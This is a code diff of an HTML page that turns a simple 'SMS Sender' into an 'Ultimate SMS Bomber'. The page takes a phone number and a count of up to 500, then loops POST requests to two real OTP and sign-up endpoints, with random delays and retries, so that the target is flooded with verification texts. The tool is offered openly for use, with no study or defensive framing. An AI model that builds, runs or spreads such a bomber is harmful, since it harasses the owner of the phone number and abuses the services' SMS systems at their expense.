@@ -3,201 +3,274 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMS Sender</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Ultimate SMS Bomber - Developed by RAMZAN AHSAN</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 400px;
+            max-width: 600px;
             margin: 0 auto;
             padding: 20px;
-            background-color: #f5f5f5;
-            color: #333;
+            background-color: #121212;
+            color: #fff;
             text-align: center;
         }
+        
         h1 {
-            color: #2c3e50;
+            color: #ff5555;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
             margin-bottom: 5px;
-            background: linear-gradient(45deg, #3498db, #9b59b6);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            font-size: 2.2rem;
         }
-        .credit {
-            color: #e74c3c;
+        
+        .subtitle {
+            color: #aaa;
+            margin-bottom: 30px;
             font-size: 14px;
-            margin-bottom: 20px;
-            font-weight: bold;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
-        .container {
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        
+        .input-group {
             margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-            color: #2c3e50;
-        }
+        
         input {
-            width: 100%;
             padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-            font-size: 16px;
+            width: 100%;
+            max-width: 300px;
+            border: 1px solid #444;
+            border-radius: 5px;
+            background-color: #222;
+            color: #fff;
+            margin-bottom: 10px;
         }
+        
         button {
-            background-color: #3498db;
+            background-color: #ff5555;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
+            padding: 12px 25px;
+            border-radius: 5px;
             cursor: pointer;
-            font-size: 16px;
-            width: 100%;
-            margin-top: 10px;
-            transition: background-color 0.3s;
+            font-weight: bold;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(255, 85, 85, 0.5);
         }
+        
         button:hover {
-            background-color: #2980b9;
+            background-color: #ff3333;
+            box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
+            transform: scale(1.05);
         }
-        #response {
+        
+        #status {
             margin-top: 20px;
             padding: 10px;
-            border-radius: 4px;
-            display: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s;
         }
-        .success {
-            background-color: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
-        }
-        .error {
-            background-color: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
-        }
-        .social-buttons {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            margin-top: 20px;
-        }
-        .social-btn {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 40px;
-            height: 40px;
-            border-radius: 50%;
-            color: white;
-            font-size: 18px;
-            text-decoration: none;
-            transition: transform 0.3s;
-        }
-        .social-btn:hover {
-            transform: translateY(-3px);
-        }
-        .whatsapp {
-            background-color: #25D366;
-        }
-        .telegram {
+        
+        .telegram-btn {
+            display: inline-block;
+            margin-top: 30px;
+            padding: 10px 20px;
             background-color: #0088cc;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: all 0.3s;
+            box-shadow: 0 0 10px rgba(0, 136, 204, 0.5);
         }
-        .whatsapp-channel {
-            background-color: #075E54;
+        
+        .telegram-btn:hover {
+            background-color: #006699;
+            box-shadow: 0 0 20px rgba(0, 136, 204, 0.8);
+            transform: scale(1.05);
         }
-        .footer-text {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #7f8c8d;
+        
+        .glow {
+            animation: glow 2s infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                box-shadow: 0 0 5px rgba(255, 85, 85, 0.5);
+            }
+            to {
+                box-shadow: 0 0 20px rgba(255, 85, 85, 0.8);
+            }
+        }
+        
+        .counter {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #aaa;
+        }
+        
+        .progress-container {
+            width: 100%;
+            max-width: 300px;
+            margin: 20px auto;
+            background-color: #222;
+            border-radius: 5px;
+            padding: 3px;
+        }
+        
+        .progress-bar {
+            height: 20px;
+            border-radius: 3px;
+            background-color: #4CAF50;
+            width: 0%;
+            transition: width 0.3s;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>SMS Sender</h1>
-        <div class="credit">Developed by RAMZAN AHSAN</div>
-        
-        <div class="form-group">
-            <label for="number">Phone Number:</label>
-            <input type="text" id="number" placeholder="923xxxxxxxxx">
-        </div>
-        
-        <div class="form-group">
-            <label for="amount">OTP Amount (1-100):</label>
-            <input type="number" id="amount" min="1" max="100" value="1">
-        </div>
-        
-        <button onclick="sendRequest()">Send SMS</button>
-        
-        <div id="response"></div>
+    <h1>ULTIMATE SMS Bomber</h1>
+    <div class="subtitle">Developed by RAMZAN AHSAN</div>
+    
+    <div class="input-group">
+        <input type="text" id="phone" placeholder="Enter phone number (923xxxxxxxxx)" pattern="923[0-9]{9}" required>
     </div>
-
-    <div class="social-buttons">
-        <a href="https://chat.whatsapp.com/LoafyPWMGOv88oElxdwOB8" class="social-btn whatsapp" target="_blank">
-            <i class="fab fa-whatsapp"></i>
-        </a>
-        <a href="https://whatsapp.com/channel/0029Vb5j7KKBVJl1T9RTk80p" class="social-btn whatsapp-channel" target="_blank">
-            <i class="fab fa-whatsapp"></i>
-        </a>
-        <a href="https://t.me/Tips0Courses" class="social-btn telegram" target="_blank">
-            <i class="fab fa-telegram-plane"></i>
-        </a>
+    
+    <div class="input-group">
+        <input type="number" id="count" placeholder="Number of OTPs (1-500)" min="1" max="500" required>
     </div>
-
-    <p class="footer-text">Join our community for more tools and tips</p>
+    
+    <button onclick="sendOTP()" class="glow">Bomb SMS</button>
+    
+    <div class="progress-container">
+        <div class="progress-bar" id="progress"></div>
+    </div>
+    
+    <div id="status"></div>
+    <div id="counter" class="counter"></div>
+    
+    <a href="https://t.me/Tips0Courses" class="telegram-btn" target="_blank">
+        Join Telegram Channel
+    </a>
 
     <script>
-        function sendRequest() {
-            const number = document.getElementById('number').value;
-            const amount = document.getElementById('amount').value;
-            const responseDiv = document.getElementById('response');
+        async function sendOTP() {
+            const phone = document.getElementById('phone').value;
+            const count = parseInt(document.getElementById('count').value);
             
-            // Clear previous response
-            responseDiv.style.display = 'none';
-            responseDiv.className = '';
-            
-            if (!number) {
-                showResponse('Please enter a phone number', 'error');
+            // Validate phone number format (923xxxxxxxxx)
+            if (!phone.match(/^923[0-9]{9}$/)) {
+                alert('Please enter a valid phone number in format 923xxxxxxxxx');
                 return;
             }
             
-            if (amount < 1 || amount > 100) {
-                showResponse('Amount must be between 1 and 100', 'error');
+            if (!count || count < 1 || count > 500) {
+                alert('Please enter a valid OTP count (1-500).');
                 return;
             }
+
+            const status = document.getElementById('status');
+            const counter = document.getElementById('counter');
+            const progress = document.getElementById('progress');
             
-            // Show loading state
-            showResponse('Sending... Please wait');
+            status.innerText = 'Initializing bomber...';
+            status.style.color = '#FFC107';
+            status.style.backgroundColor = 'rgba(255, 193, 7, 0.2)';
             
-            const url = `https://fam-official.serv00.net/sim/famsimsmsboom.php?number=${number}&amount=${amount}`;
+            let successCount = 0;
+            let failCount = 0;
+            let retryCount = 0;
+            const maxRetries = 2;
             
-            fetch(url)
-                .then(response => response.text())
-                .then(data => {
-                    showResponse('SMS sent successfully!', 'success');
-                })
-                .catch(error => {
-                    showResponse('Error: ' + error.message, 'error');
-                });
-        }
-        
-        function showResponse(message, type = '') {
-            const responseDiv = document.getElementById('response');
-            responseDiv.textContent = message;
-            responseDiv.className = type;
-            responseDiv.style.display = 'block';
+            // Disable button during operation
+            const btn = document.querySelector('button');
+            btn.disabled = true;
+            btn.innerText = 'Bombing in progress...';
+            
+            // Array of API endpoints with their configurations
+            const apiConfigs = [
+                {
+                    url: `https://bajao.pk/api/v2/login/generatePin?uuid=${phone}`,
+                    method: 'POST',
+                    headers: {},
+                    body: null
+                },
+                {
+                    url: `https://tappayments.tapmad.com/pay/api/initiatePaymentTransactionNewPackage`,
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        Version: 'V1',
+                        Language: 'en',
+                        Platform: 'web',
+                        ProductId: 1733,
+                        MobileNo: phone,
+                        OperatorId: '100007',
+                        URL: 'https://www.tapmad.com/sign-up',
+                        source: 'organic',
+                        medium: 'organic'
+                    })
+                }
+            ];
+            
+            // Send requests with better handling
+            for (let i = 0; i < count; i++) {
+                const currentApi = apiConfigs[i % apiConfigs.length];
+                let attempt = 0;
+                let success = false;
+                
+                // Update UI
+                counter.innerText = `Sending ${i+1} of ${count}...`;
+                progress.style.width = `${((i+1)/count)*100}%`;
+                
+                // Try with retries
+                while (attempt <= maxRetries && !success) {
+                    try {
+                        // Random delay between 800-1500ms
+                        await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 700));
+                        
+                        const response = await fetch(currentApi.url, {
+                            method: currentApi.method,
+                            headers: currentApi.headers,
+                            body: currentApi.body
+                        });
+                        
+                        if (response.ok) {
+                            success = true;
+                            successCount++;
+                        } else {
+                            throw new Error(`API returned ${response.status}`);
+                        }
+                    } catch (error) {
+                        attempt++;
+                        if (attempt > maxRetries) {
+                            failCount++;
+                            console.error(`Failed after ${maxRetries} retries for request ${i+1}:`, error);
+                        }
+                    }
+                }
+                
+                // Update status more frequently
+                if (i % 5 === 0 || i === count - 1) {
+                    status.innerText = `Bombing in progress... (${i+1}/${count})`;
+                }
+            }
+            
+            // Final report
+            status.innerText = `Bombing completed successfully!`;
+            counter.innerText = `Total: ${count} | Success: ${successCount} (${Math.round((successCount/count)*100)}%) | Failed: ${failCount}`;
+            status.style.color = '#4CAF50';
+            status.style.backgroundColor = 'rgba(76, 175, 80, 0.2)';
+            progress.style.backgroundColor = '#4CAF50';
+            
+            // Re-enable button
+            btn.disabled = false;
+            btn.innerText = 'Bomb SMS';
+            
+            // Auto-reset after 30 seconds
+            setTimeout(() => {
+                status.innerText = '';
+                counter.innerText = '';
+                progress.style.width = '0%';
+            }, 30000);
         }
     </script>
 </body>
